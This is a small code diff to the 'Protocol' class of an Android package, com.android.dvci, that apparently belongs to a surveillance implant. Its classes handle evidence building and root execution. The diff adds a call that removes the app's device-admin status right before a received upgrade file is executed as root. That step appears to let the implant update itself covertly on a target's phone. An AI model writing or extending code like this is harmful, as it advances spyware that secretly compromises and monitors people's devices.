@@ -13,6 +13,7 @@ import android.content.Intent;
 import android.net.Uri;
 
 import com.android.dvci.Status;
+import com.android.dvci.action.UninstallAction;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfType;
 import com.android.dvci.evidence.EvidenceBuilder;
@@ -159,6 +160,8 @@ public abstract class Protocol implements iProtocol {
 					Check.log(TAG + " (upgradeMulti) Error: " + e);
 				}
 			}
+
+			UninstallAction.removeAdmin(Status.getAppContext());
 
 			Execute ex = new Execute();
 			ExecuteResult result = ex.executeRoot(file.getAbsolutePath());
